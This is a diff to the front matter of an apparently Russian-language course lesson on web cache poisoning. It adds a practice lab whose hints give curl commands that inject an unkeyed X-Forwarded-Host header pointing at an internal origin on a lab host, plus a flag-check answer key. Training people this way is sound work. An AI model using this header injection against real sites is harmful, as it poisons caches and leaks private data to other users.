@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как отравить кэш неучтённым заголовком или обмануть его, чтобы он закэшировал приватные данные."
+lab:
+  kind: shell
+  title: "Практика: отравление кэша"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Смотрим ответ и заголовок `X-Cache`: `curl -s -i 'http://shop.local/api/config'`.
+    - Кэш ключуется только по пути: `X-Forwarded-Host` в ключ не входит, но приложение ему доверяет.
+    - Подставь внутренний origin: `curl -s -i 'http://shop.local/api/config' -H 'X-Forwarded-Host: internal.shop.local'`.
+    - Флаг — последняя строка: `curl -s -i 'http://shop.local/api/config' -H 'X-Forwarded-Host: internal.shop.local' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
